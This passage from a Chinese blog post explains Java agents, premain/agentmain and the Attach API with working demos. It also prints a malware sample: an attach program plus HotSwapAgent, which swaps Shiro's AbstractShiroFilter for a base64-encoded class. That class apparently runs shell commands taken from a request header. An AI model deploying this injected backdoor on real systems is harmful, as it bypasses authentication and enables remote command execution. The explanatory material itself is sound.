\u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; 然后，给 Cat 类编写测试用的主类：\n1 2 3 4 5 6 public class CatMain { public static void main(String[] args) throws InterruptedException { Cat.run(); } } 并把两者构建成可执行且名为 app 的 jar 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-shade-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;shade\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;finalName\u0026gt;app\u0026lt;/finalName\u0026gt; \u0026lt;shadedArtifactAttached\u0026gt;true\u0026lt;/shadedArtifactAttached\u0026gt; \u0026lt;transformers\u0026gt; \u0026lt;transformer implementation= \u0026#34;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\u0026#34;\u0026gt; \u0026lt;mainClass\u0026gt;io.h2cone.inst.app.CatMain\u0026lt;/mainClass\u0026gt; \u0026lt;/transformer\u0026gt; \u0026lt;/transformers\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; 最后，得到了 agent-jar-with-dependencies.jar 和 app.jar 后，查阅 Java agent 命令行接口文档：\n1 -javaagent:jarpath[=options] jarpath 是 agent jar 文件的路径，可选的 options 能传递给 agent 类的 premain 方法，这里传递 Cat 类的命名：io/h2cone/inst/app/Cat，表示我们要测量它的方法执行时间：\n1 java -javaagent:agent-jar-with-dependencies.jar=io/h2cone/inst/app/Cat -jar app.jar 结果表明，不仅 Cat 类的 run 方法正常执行，而且输出了该方法的执行时间：\n1 2 Cat is running io.h2cone.inst.app.Cat.run(): 73993800 ns 完整代码已发布，请参考 inst-agent 和 inst-app。\nAttach 简述 翻阅 Oracle JDK 文档可以找到名为 com.sun.tools.attach 的包：\nProvides the API to attach to a Java virtual machine. [3]\n在上一节，列出了加载 Java agent 的两种方式，第二种方式使用 Attach API，把 Java agent 附加到启动后的 JVM，采用这种方式无需重启 JVM。Attach 是如何实现的呢？初步大胆猜想，利用 Attach API 编写而成的程序与目标 JVM 进行了线程间通信，传输 Java agent 并装载到目标 JVM。\n跟踪程序通过 Unix Domain Socket 与目标 JVM 的 Attach Listener 线程进行交互。[4]\n例子 编写一只可以持续汪汪叫的小狗：\n1 2 3 4 5 6 7 8 9 10 11 public class DogMain { public static void main(String[] args) throws InterruptedException { String name = ManagementFactory.getRuntimeMXBean().getName(); System.out.printf(\u0026#34;managed bean name: %s\\n\u0026#34;, name); while (true) { Thread.sleep(10000); CompletableFuture.runAsync(() -\u0026gt; System.out.println(\u0026#34;Woof Woof\u0026#34;)); } } } 这个程序跑起来后 20 秒内输出：\n1 2 managed bean name: 5424@borvino Woof Woof 注意 managed bean name 的值为 5424@borvino，当中的 5424 就是这个进程的 PID。\n方便起见，编写简易的 agent 类：\n1 2 3 4 5 6 7 8 9 10 11 12 public class OwnerAgent { public static void agentmain(String agentArgs, Instrumentation inst) throws Exception { System.out.println(\u0026#34;agentmain agentArgs: \u0026#34; + agentArgs); System.out.println(\u0026#34;agentmain inst: \u0026#34; + inst); } public static void premain(String agentArgs, Instrumentation inst) throws Exception { System.out.println(\u0026#34;premain agentArgs: \u0026#34; + agentArgs); System.out.println(\u0026#34;premain inst: \u0026#34; + inst); } } 回想前文所说的获取 Instrumentation 实例的两种方式，当把 Java agent 附加到 JVM 时，Instrumentation 实例将传递到 agent 类的 agentmain 方法，也是就说 agentmain 将会被调用。\n不忘编写 MANIFEST.MF 文件：\n1 2 3 4 5 Manifest-Version: 1.0 Premain-Class: io.h2cone.attach.agent.OwnerAgent Agent-Class: io.h2cone.attach.agent.OwnerAgent Can-Redefine-Classes: true Can-Retransform-Classes: true 既声明 Agent-Class 也声明 Premain-Class，OwnerAgent 类同时满足两种方式所要求的方法签名。\n与上文相似，打包好 agent.jar 后，方便起见，直接用 IDE 启动 DogMain，从控制台读取目标 JVM 的 PID，万事俱备，首先依附到 JVM，然后动态加载 agent 到 JVM，最后分离：\n1 2 3 4 5 6 7 8 9 10 @Test public void attach() throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String pid = \u0026#34;pid\u0026#34;; // 目标 JVM 的 PID VirtualMachine vm = VirtualMachine.attach(pid); String agentJarPath = \u0026#34;path to agent.jar\u0026#34;; // agent.jar 文件的路径 String options = \u0026#34;Hello, Dog\u0026#34;; vm.loadAgent(agentJarPath, options); vm.detach(); } 试验结果：\n1 2 3 4 5 6 managed bean name: 5424@borvino Woof Woof agentmain agentArgs: Hello, Dog agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8 Woof Woof Woof Woof OwnerAgent 类的 agentmain 方法被调用，DogMain 的 main 方法也正常执行。\n完整代码已发布，请参考 attach-agent 和 attach-app。\n恶意程序 Test.class：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Test { public static void main(String[] paramArrayOfString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException { attach(paramArrayOfString[0]); } public static void attach(String paramString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException { String str1 = paramString; String str2 = (new File(\u0026#34;agent.jar\u0026#34;)).getAbsolutePath(); System.out.println(\u0026#34;attaching....pid=\u0026#34; + str1); VirtualMachine virtualMachine = VirtualMachine.attach(str1); virtualMachine.loadAgent(str2, null); virtualMachine.detach(); } } agent.jar/HotSwapAgent.class：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class HotSwapAgent { public static void premain(String paramString, Instrumentation paramInstrumentation) {} public static void agentmain(String paramString, Instrumentation paramInstrumentation) { try { Class[] arrayOfClass = paramInstrumentation.getAllLoadedClasses(); for (Class\u0026lt;?\u0026gt; clazz : arrayOfClass) { if (clazz.getName().equals(\u0026#34;org.apache.shiro.web.servlet.AbstractShiroFilter\u0026#34;)) { System.out.println(clazz.getName()); byte[] arrayOfByte = (new BASE64Decoder()).decodeBuffer(\u0026#34;yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFLAUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hbmFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdleGVjdXRlAQAzKExqYXZhL3V0aWwvY29uY3VycmVudC9DYWxsYWJsZTspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2F1c2UBABcoKUxqYXZhL2xhbmcvVGhyb3dhYmxlOwEABWRlYnVnAQAIZ2V0Q2hhaW4BAAV0cmFjZQEACGRvRmlsdGVyAQAXb3JnL3NsZjRqL0xvZ2dlckZhY3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0ai9Mb2dnZXI7BCEAYABiAAAABQAaAGUAZgAAABoAZwBoAAEAaQAAAAIACwACAGoAawAAAAIAbABtAAAAAgBuAG8AAAAXAAQAcABxAAEAcgAAACoAAgABAAAACiq3AAEqA7UAArEAAAABAHMAAAAOAAMAAABdAAQAXgAJAF8AAQB0AHUAAQByAAAAHQABAAEAAAAFKrQAA7AAAAABAHMAAAAGAAEAAABiAAEAdgB3AAEAcgAAACIA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\u0026#34;); ClassDefinition classDefinition = new ClassDefinition(clazz, arrayOfByte); try { paramInstrumentation.redefineClasses(new ClassDefinition[] { classDefinition }); } catch (Exception e) { e.printStackTrace(); } } } } catch (Exception e) {} } } agent.jar/META-INF/MANIFEST.MF：\n1 2 3 4 5 Manifest-Version: 1.0 Can-Redefine-Classes: true Agent-Class: HotSwapAgent Premain-Class: HotSwapAgent Can-Retransform-Classes: true 作者用自定义类替换 “org.apache.shiro.web.servlet.AbstractShiroFilter”，企图绕过鉴权。\n写在后面 微服务架构下，进程间的联系错综复杂，客户端的请求到了服务器端后可能形成了复杂的调用链，假如发生了异常，如何查明哪里发生故障以及什么原因导致性能下降？分布式追踪（Distributed Tracing） 正是一种解决方案。Java 王国有着许许多多的 APM（Application Performance Monitoring）系统专门解决此类问题，例如 SkyWalking、Zipkin、Pinpoint，它们或多或少支持了名为 OpenTracing 的标准，分布式追踪的标准与技术非常有助于微服务架构下的故障排除。\n本文首发于 https://h2cone.github.io\n文章参考 Package java.lang.instrument\nInstrumentation (computer programming)\nInterface Instrumentation\nAttach API\n入门科普，围绕JVM的各种外挂技术\njava-instrumentation\nGuide to Java Instrumentation\nJava Attach API\nJAVA 拾遗 \u0026ndash;Instrument 机制\nInstrumentation: querying the memory usage of a Java object\nJava动态追踪技术探究\nJVM 源码分析之 javaagent 